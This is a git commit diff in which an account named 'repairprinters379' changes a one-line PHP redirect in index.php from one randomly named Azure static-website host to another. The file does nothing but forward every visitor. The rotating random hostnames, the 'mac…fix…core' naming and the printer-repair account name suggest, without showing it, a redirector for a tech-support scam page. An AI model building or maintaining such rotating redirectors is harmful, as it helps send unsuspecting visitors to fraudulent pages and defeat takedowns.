1af4525e70b9d9b33c731ff5669efe6fea9cb5ae
repairprinters379 <repairprinters379@gmail.com>
2025-01-13 21:46:15 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://maxmusiufop.z8.web.core.windows.net/");
+header("Location: https://mac977fix768core87jds.z12.web.core.windows.net/");
  
 exit;
 ?>
